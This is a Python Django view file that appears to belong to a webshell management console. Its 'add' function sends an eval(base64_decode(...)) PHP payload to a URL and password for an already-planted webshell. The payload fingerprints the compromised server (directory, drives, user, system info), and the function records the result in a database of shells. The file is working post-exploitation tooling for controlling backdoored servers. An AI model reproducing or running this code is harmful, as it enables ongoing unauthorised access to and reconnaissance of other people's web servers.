import base64
import json
import urllib
from urllib.error import HTTPError

from django.http import HttpResponse
from db.models import webshell

# Create your views here.
def add(request):
    remarks = request.GET['remarks']
    links = request.GET['links']
    passwd = request.GET['passwd']
    type = request.GET['type']
    # print(remarks,links,passwd,type)
    try:
        # 连接小马
        # 构建请求包
        data = {
            passwd: "@eval(base64_decode($_POST[z0]));",
            'z0': """QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfXwiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO30kUi49InwiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztkaWUoKTs="""
        }
        data = urllib.parse.urlencode(data).replace('-', '%2B').encode('ascii')
        req = urllib.request.Request(links, data)
        response = urllib.request.urlopen(req)
        compressedData = response.read().split(b'|')
        webshell.objects.create(remarks=remarks, links=links, passwd=passwd, type=type, ponypath=compressedData[0], desk=compressedData[1],information=compressedData[2])
        result = "添加成功"
    except HTTPError:
        # urllib.error.HTTPError: HTTP Error 404: Not Found
        # print(HTTPError.code)
        result = "添加失败"

    shell = webshell.objects.all()
    WEBHSELL = []
    for s in shell:
        t = {}
        t['id'] = s.id
        t['remarks'] = s.remarks
        t['links'] = s.links
        t['type'] = s.type
        t['time'] = str(s.time)
        # print(time.strftime('%Y-%m-%d',t['time']))
        WEBHSELL.append(t)
    return HttpResponse(json.dumps({'webshell': WEBHSELL,'result':result}))